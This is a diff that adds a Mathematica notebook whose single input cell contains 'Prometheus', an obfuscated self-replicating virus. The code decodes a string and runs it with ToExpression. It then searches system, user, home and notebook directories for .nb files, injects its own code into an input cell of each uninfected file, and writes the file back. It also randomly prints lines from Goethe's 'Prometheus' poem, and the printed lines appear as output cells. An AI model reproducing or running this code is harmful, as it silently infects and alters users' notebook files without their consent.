@@ -1,0 +1,296 @@
+(* Content-type: application/mathematica *)
+
+(*** Wolfram Notebook File ***)
+(* http://www.wolfram.com/nb *)
+
+(* CreatedBy='Mathematica 6.0' *)
+
+(*CacheID: 234*)
+(* Internal cache information:
+NotebookFileLineBreakTest
+NotebookFileLineBreakTest
+NotebookDataPosition[       145,          7]
+NotebookDataLength[     14000,        287]
+NotebookOptionsPosition[     12728,        245]
+NotebookOutlinePosition[     13069,        260]
+CellTagsIndexPosition[     13026,        257]
+WindowFrame->Normal
+ContainsDynamic->False*)
+
+(* Beginning of Notebook Content *)
+Notebook[{
+
+Cell[CellGroupData[{
+Cell[BoxData[{
+ RowBox[{
+  RowBox[{
+  "Prometheus", ":=", 
+   "\"\<PreProMeth:=StringReplace[XYZ,xYzaBc[IndentingNewLine]xYz,RowBox[{\
+RowBox[{xYzPrometheusxYz,xYz:=xYz,xYzaBcxYzaBc<XYZ,{XYZxYzXYZ->\
+FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[92]}];PostProMeth:=\
+StringReplace[XYZaBc>aBcxYzxYz}],xYz;xYz,RowBox[{xYzToExpressionxYz,xYz[xYz,\
+RowBox[{xYzStringReplacexYz,xYz[xYz,RowBox[{xYzPrometheusxYz,xYz,xYz,RowBox[{\
+xYz{xYz,RowBox[{RowBox[{RowBox[{xYzaBcxYzaBc<XYaBc>aBcxYzxYz,xYz<>xYz,\
+xYzaBcxYzaBc<ZaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,\
+xYz[xYz,xYz34xYz,xYz]xYz}]}],xYz,xYz,RowBox[{RowBox[{xYzaBcxYzaBc<ABaBc>\
+aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<CaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{\
+xYzFromCharacterCodexYz,xYz[xYz,xYz92xYz,xYz]xYz}]}]}],xYz}xYz}]}],xYz]xYz}],\
+xYz]xYz}]}]XYZ,{XYZxYzXYZ->FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[\
+92]}];DirList:=Join[$Path,List[$InitialDirectory,ParentDirectory[],$\
+HomeDirectory,$BaseDirectory,$InstallationDirectory,$UserBaseDirectory,$\
+UserDocumentsDirectory,NotebookDirectory[]]];For[j=1,j<=Length[DirList],j++,\
+SetDirectory[DirList[[j]]];FileList:=FileNames[XYZ*.nbXYZ];For[i=1,i<=Length[\
+FileList],i++,VictimCode=FromCharacterCode[BinaryReadList[FileList[[i]]]];If[\
+StringCount[VictimCode,XYZPrometheusXYZ]==0,VictimCode=StringReplace[\
+VictimCode,XYZ(*CacheID:XYZ->XYZ(*PrometheusXYZ];CacheStrPos=StringPosition[\
+VictimCode,XYZ(* Internal cache information \
+*)XYZ];If[Length[CacheStrPos]>0,VictimCode=StringTake[VictimCode,CacheStrPos[[\
+1]][[1]]-1]];PossibleInfPlaces=StringPosition[VictimCode,XYZ], \
+XYZ<>FromCharacterCode[34]<>XYZInputXYZ<>FromCharacterCode[34]];If[Length[\
+PossibleInfPlaces]>0,InfPos=RandomInteger[{1,Length[PossibleInfPlaces]}];\
+InfPlace=PossibleInfPlaces[[InfPos]][[1]]-1;If[StringTake[VictimCode,{\
+InfPlace}]!=XYZ}XYZ,tmpPre=StringTake[VictimCode,InfPlace];tmpPost=StringTake[\
+VictimCode,-(StringLength[VictimCode]-StringLength[tmpPre])];PosOfDataBox=\
+StringPosition[tmpPre,XYZCell[BoxData[XYZ];tmpPre=StringTake[tmpPre,Last[\
+PosOfDataBox][[2]]]<>XYZ{XYZ<>StringTake[tmpPre,-(StringLength[tmpPre]-Last[\
+PosOfDataBox][[2]])];VictimCode=tmpPre<>XYZ}XYZ<>tmpPost;InfPlace=InfPlace+2;]\
+;InfPlace=InfPlace-1;PreInf=StringTake[VictimCode,InfPlace];PostInf=\
+StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[PreInf])];\
+InfectedCode=PreInf<>PreProMeth<>Prometheus<>PostProMeth<>PostInf;BinaryWrite[\
+FileList[[i]],ToCharacterCode[InfectedCode]];Close[FileList[[i]]];ProMList=\
+List[XYZHere I sit, forming peopleXYZ,XYZIn my image;XYZ,XYZA race, to be \
+like me,XYZ,XYZTo suffer, to weep,XYZ,XYZTo enjoy and delight \
+themselves,XYZ,XYZAnd to mock you ABC[Dash]XYZ,XYZAs I \
+do!XYZ];If[RandomInteger[5]==3,Print[ProMList[[RandomInteger[6]+1]]]]]];]]\>\"\
+"}], ";"}], "\[IndentingNewLine]", 
+ RowBox[{"ToExpression", "[", 
+  RowBox[{"StringReplace", "[", 
+   RowBox[{"Prometheus", ",", 
+    RowBox[{"{", 
+     RowBox[{
+      RowBox[{"\"\<XYZ\>\"", "\[Rule]", 
+       RowBox[{"FromCharacterCode", "[", "34", "]"}]}], ",", 
+      RowBox[{"\"\<ABC\>\"", "\[Rule]", 
+       RowBox[{"FromCharacterCode", "[", "92", "]"}]}]}], "}"}]}], "]"}], 
+  "]"}]}], "Input",
+ CellChangeTimes->{{3.5077668000625*^9, 3.507766832375*^9}, {
+   3.5077669231875*^9, 3.507767004*^9}, {3.5077670720625*^9, 
+   3.507767158265625*^9}, {3.507767211859375*^9, 3.507767255328125*^9}, {
+   3.5077673050625*^9, 3.507767391328125*^9}, {3.507767446265625*^9, 
+   3.50776744778125*^9}, {3.507769428296875*^9, 3.5077695138125*^9}, {
+   3.507769562203125*^9, 3.50776961890625*^9}, {3.50776967403125*^9, 
+   3.507769714296875*^9}, {3.5077699530625*^9, 3.507770022984375*^9}, {
+   3.507770059875*^9, 3.507770114390625*^9}, {3.5077735499375*^9, 
+   3.381599011125*^9}, {3.3815991685625*^9, 3.381599263484375*^9}, {
+   3.3819830294375*^9, 3.38198306953125*^9}, {3.38198347925*^9, 
+   3.38198356909375*^9}, {3.381983599984375*^9, 3.381983610765625*^9}, {
+   3.381983699875*^9, 3.38198375375*^9}, {3.38198415240625*^9, 
+   3.381984220765625*^9}, {3.38198441421875*^9, 3.381984423343375*^9}, {
+   3.381984998343375*^9, 3.381985045655875*^9}, 3.382001234328125*^9, {
+   3.38200133928125*^9, 3.382001416390625*^9}, {3.382001451234375*^9, 
+   3.3820015246875*^9}, {3.382001555359375*^9, 3.3820015568125*^9}, {
+   3.382001654671875*^9, 3.382001692171875*^9}, {3.382001749484375*^9, 
+   3.382001774125*^9}, 3.382001898640625*^9, {3.382001932703125*^9, 
+   3.3820019500625*^9}, {3.382002006234375*^9, 3.382002027390625*^9}, {
+   3.382002072890625*^9, 3.38200207621875*^9}, 3.382002354546875*^9, {
+   3.382002442453125*^9, 3.38200246553125*^9}, 3.38200249821875*^9, {
+   3.382002547484375*^9, 3.38200259515625*^9}, {3.382002677890625*^9, 
+   3.38200268634375*^9}, {3.382002800109375*^9, 3.38200280340625*^9}, {
+   3.382002841125*^9, 3.38200284903125*^9}, {3.382002917515625*^9, 
+   3.382002918328125*^9}, {3.3820029814375*^9, 3.382003016609375*^9}, {
+   3.38200305046875*^9, 3.38200308009375*^9}, {3.38200315396875*^9, 
+   3.382003161921875*^9}, {3.508262712281002*^9, 3.508262730658825*^9}, {
+   3.5082628990753145`*^9, 3.5082629876826725`*^9}, {3.5082631328143363`*^9, 
+   3.5082631601779137`*^9}, {3.5082636223111906`*^9, 3.50826367742762*^9}, {
+   3.5082637122914567`*^9, 3.5082637350599957`*^9}, {3.5082637940988016`*^9, 
+   3.5082639412582607`*^9}, {3.5082645890130377`*^9, 
+   3.5082645904663486`*^9}, {3.508264629174428*^9, 3.5082646438011765`*^9}, {
+   3.508264735669958*^9, 3.508264737576403*^9}, 3.5082647960980206`*^9, 
+   3.508264830226515*^9, {3.5082648732777977`*^9, 3.5082649404252977`*^9}, {
+   3.5082654375230703`*^9, 3.50826559378907*^9}, {3.508265660842811*^9, 
+   3.508265663889985*^9}, {3.5082657050027804`*^9, 3.5082658211843204`*^9}, {
+   3.5082658558434544`*^9, 3.508265857953005*^9}, {3.508265971321811*^9, 
+   3.5082660331707067`*^9}, {3.5082665360250406`*^9, 
+   3.5082668167186117`*^9}, {3.508266926835739*^9, 3.5082669743390827`*^9}, {
+   3.5082672523274016`*^9, 3.508267364710313*^9}, {3.508267476686946*^9, 
+   3.508267529003128*^9}, 3.508267561005381*^9, {3.508267596304741*^9, 
+   3.50826761866569*^9}, {3.5082676718725605`*^9, 3.508267673778945*^9}, {
+   3.5082677956301956`*^9, 3.5082678095997505`*^9}, {3.508268185480775*^9, 
+   3.5082681856839113`*^9}, {3.508268263766534*^9, 3.5082683329580193`*^9}, {
+   3.5082688902850156`*^9, 3.5082689183018956`*^9}, {3.508269562127613*^9, 
+   3.508269677007759*^9}, {3.5082707825351143`*^9, 3.508270782894503*^9}, {
+   3.508270816489335*^9, 3.5082708598344717`*^9}, {3.5082716649539847`*^9, 
+   3.5082716774700108`*^9}, {3.5082718693351326`*^9, 
+   3.5082720233703256`*^9}, {3.508274278947354*^9, 3.508274286916206*^9}, {
+   3.5082743174322214`*^9, 3.508274320026005*^9}, 3.5082743529014254`*^9, 
+   3.50827462046735*^9, {3.5082746508114886`*^9, 3.508274739343872*^9}, {
+   3.5082747904226503`*^9, 3.5082748495484076`*^9}, {3.5082749378307877`*^9, 
+   3.5082749696280694`*^9}, 3.5082767081034465`*^9, {3.508276758150962*^9, 
+   3.508276769932363*^9}, {3.508277245483296*^9, 3.5082772840304174`*^9}, {
+   3.5082780012693825`*^9, 3.5082780175819874`*^9}, {3.5082808073185916`*^9, 
+   3.508280865865841*^9}, {3.508280907944236*^9, 3.508280917913049*^9}, {
+   3.508280966319609*^9, 3.5082809663977346`*^9}, {3.5082810146792936`*^9, 
+   3.5082810788984547`*^9}, {3.508281133976932*^9, 3.5082811606177273`*^9}, {
+   3.508282134482813*^9, 3.508282142029688*^9}, 3.508282380342188*^9, {
+   3.508282517014063*^9, 3.508282570107813*^9}, {3.508282609982813*^9, 
+   3.508282653185938*^9}, {3.508282875654688*^9, 3.508282999389063*^9}, {
+   3.508283056232813*^9, 3.508283070373438*^9}, {3.508283144514063*^9, 
+   3.508283147498438*^9}, {3.508283213420313*^9, 3.508283255389063*^9}, {
+   3.508283285498438*^9, 3.508283292201563*^9}, {3.508283358935938*^9, 
+   3.508283383795313*^9}, {3.508283473060938*^9, 3.508283485654688*^9}, {
+   3.508283617889063*^9, 3.508283621185938*^9}, {3.508284391951563*^9, 
+   3.508284425029688*^9}, {3.508284525154688*^9, 3.508284525326563*^9}, {
+   3.508284630279688*^9, 3.508284684732813*^9}, {3.508284847467188*^9, 
+   3.508284847545313*^9}, {3.508285031232813*^9, 3.508285225529688*^9}, {
+   3.508285523607813*^9, 3.508285578545313*^9}, {3.508285624170313*^9, 
+   3.508285641795313*^9}, {3.508285700998438*^9, 3.508285716732813*^9}, {
+   3.508285758154688*^9, 3.508285952654688*^9}, 3.508286224873438*^9, {
+   3.508288197685938*^9, 3.508288198639063*^9}, {3.508288612060938*^9, 
+   3.508288655045313*^9}, 3.508288695889063*^9, {3.508289282154688*^9, 
+   3.508289341154688*^9}, {3.508289379170313*^9, 3.508289577685938*^9}, {
+   3.508289674951563*^9, 3.508289704373438*^9}, {3.508289764873438*^9, 
+   3.508289834185938*^9}, {3.508289900451563*^9, 3.508289998498438*^9}, {
+   3.508290257545313*^9, 3.508290263123438*^9}, 3.508290421389063*^9, {
+   3.508290655717188*^9, 3.508290655842188*^9}, {3.508290732404688*^9, 
+   3.508290774623438*^9}, 3.508291607279688*^9, {3.508292109670313*^9, 
+   3.508292188857813*^9}, {3.508292236045313*^9, 3.508292322623438*^9}, {
+   3.508292370092188*^9, 3.508292385592188*^9}, {3.508292447748438*^9, 
+   3.508292477217188*^9}, {3.508297689123438*^9, 3.508297728264063*^9}, {
+   3.508297795732813*^9, 3.508297819795313*^9}, {3.508297982779688*^9, 
+   3.508297988732813*^9}, {3.508298119185938*^9, 3.508298120264063*^9}, {
+   3.508299099639063*^9, 3.508299115920313*^9}, 3.508299164764063*^9, {
+   3.508299295357813*^9, 3.508299314795313*^9}, 3.508299375435938*^9, {
+   3.508299516842188*^9, 3.508299620998438*^9}, {3.508299769967188*^9, 
+   3.508299847623438*^9}, 3.508300018529688*^9, {3.508300065842188*^9, 
+   3.508300078967188*^9}}],
+
+Cell[CellGroupData[{
+
+Cell[BoxData["\<\"In my image;\"\>"], "Print",
+ CellChangeTimes->{3.508300243529688*^9}],
+
+Cell[BoxData["\<\"To suffer, to weep,\"\>"], "Print",
+ CellChangeTimes->{3.508300243670313*^9}],
+
+Cell[BoxData["\<\"As I do!\"\>"], "Print",
+ CellChangeTimes->{3.508300244935938*^9}],
+
+Cell[BoxData["\<\"And to mock you \[Dash]\"\>"], "Print",
+ CellChangeTimes->{3.508300245529688*^9}],
+
+Cell[BoxData["\<\"And to mock you \[Dash]\"\>"], "Print",
+ CellChangeTimes->{3.508300245685938*^9}],
+
+Cell[BoxData["\<\"And to mock you \[Dash]\"\>"], "Print",
+ CellChangeTimes->{3.508300246404688*^9}],
+
+Cell[BoxData["\<\"To suffer, to weep,\"\>"], "Print",
+ CellChangeTimes->{3.508300247014063*^9}],
+
+Cell[BoxData["\<\"To enjoy and delight themselves,\"\>"], "Print",
+ CellChangeTimes->{3.508300247623438*^9}],
+
+Cell[BoxData["\<\"And to mock you \[Dash]\"\>"], "Print",
+ CellChangeTimes->{3.508300248326563*^9}],
+
+Cell[BoxData["\<\"In my image;\"\>"], "Print",
+ CellChangeTimes->{3.508300248810938*^9}],
+
+Cell[BoxData["\<\"A race, to be like me,\"\>"], "Print",
+ CellChangeTimes->{3.508300249748438*^9}],
+
+Cell[BoxData["\<\"As I do!\"\>"], "Print",
+ CellChangeTimes->{3.508300249982813*^9}],
+
+Cell[BoxData["\<\"In my image;\"\>"], "Print",
+ CellChangeTimes->{3.508300250232813*^9}],
+
+Cell[BoxData["\<\"And to mock you \[Dash]\"\>"], "Print",
+ CellChangeTimes->{3.508300251201563*^9}],
+
+Cell[BoxData["\<\"As I do!\"\>"], "Print",
+ CellChangeTimes->{3.508300251889063*^9}],
+
+Cell[BoxData["\<\"A race, to be like me,\"\>"], "Print",
+ CellChangeTimes->{3.508300252779688*^9}],
+
+Cell[BoxData["\<\"In my image;\"\>"], "Print",
+ CellChangeTimes->{3.508300253342188*^9}],
+
+Cell[BoxData["\<\"To suffer, to weep,\"\>"], "Print",
+ CellChangeTimes->{3.508300254342188*^9}],
+
+Cell[BoxData["\<\"In my image;\"\>"], "Print",
+ CellChangeTimes->{3.508300254670313*^9}],
+
+Cell[BoxData["\<\"To enjoy and delight themselves,\"\>"], "Print",
+ CellChangeTimes->{3.508300255701563*^9}],
+
+Cell[BoxData["\<\"A race, to be like me,\"\>"], "Print",
+ CellChangeTimes->{3.508300256701563*^9}],
+
+Cell[BoxData["\<\"To enjoy and delight themselves,\"\>"], "Print",
+ CellChangeTimes->{3.508300256826563*^9}],
+
+Cell[BoxData["\<\"To suffer, to weep,\"\>"], "Print",
+ CellChangeTimes->{3.508300257607813*^9}],
+
+Cell[BoxData["\<\"In my image;\"\>"], "Print",
+ CellChangeTimes->{3.508300258201563*^9}],
+
+Cell[BoxData["\<\"As I do!\"\>"], "Print",
+ CellChangeTimes->{3.508300258420313*^9}]
+}, Open  ]]
+}, Open  ]]
+},
+WindowSize->{1912, 1100},
+WindowMargins->{{0, Automatic}, {Automatic, 0}},
+FrontEndVersion->"6.0 for Microsoft Windows (32-bit) (June 19, 2007)",
+StyleDefinitions->"Default.nb"
+]
+(* End of Notebook Content *)
+
+(* Internal cache information *)
+(*CellTagsOutline
+CellTagsIndex->{}
+*)
+(*CellTagsIndex
+CellTagsIndex->{}
+*)
+(*NotebookFileOutline
+Notebook[{
+Cell[CellGroupData[{
+Cell[590, 23, 9656, 141, 292, "Input"],
+Cell[CellGroupData[{
+Cell[10271, 168, 88, 1, 23, "Print"],
+Cell[10362, 171, 95, 1, 23, "Print"],
+Cell[10460, 174, 84, 1, 23, "Print"],
+Cell[10547, 177, 99, 1, 23, "Print"],
+Cell[10649, 180, 99, 1, 23, "Print"],
+Cell[10751, 183, 99, 1, 23, "Print"],
+Cell[10853, 186, 95, 1, 23, "Print"],
+Cell[10951, 189, 108, 1, 23, "Print"],
+Cell[11062, 192, 99, 1, 23, "Print"],
+Cell[11164, 195, 88, 1, 23, "Print"],
+Cell[11255, 198, 98, 1, 23, "Print"],
+Cell[11356, 201, 84, 1, 23, "Print"],
+Cell[11443, 204, 88, 1, 23, "Print"],
+Cell[11534, 207, 99, 1, 23, "Print"],
+Cell[11636, 210, 84, 1, 23, "Print"],
+Cell[11723, 213, 98, 1, 23, "Print"],
+Cell[11824, 216, 88, 1, 23, "Print"],
+Cell[11915, 219, 95, 1, 23, "Print"],
+Cell[12013, 222, 88, 1, 23, "Print"],
+Cell[12104, 225, 108, 1, 23, "Print"],
+Cell[12215, 228, 98, 1, 23, "Print"],
+Cell[12316, 231, 108, 1, 23, "Print"],
+Cell[12427, 234, 95, 1, 23, "Print"],
+Cell[12525, 237, 88, 1, 23, "Print"],
+Cell[12616, 240, 84, 1, 23, "Print"]
+}, Open  ]]
+}, Open  ]]
+}
+]
+*)
+
+(* End of internal cache information *)
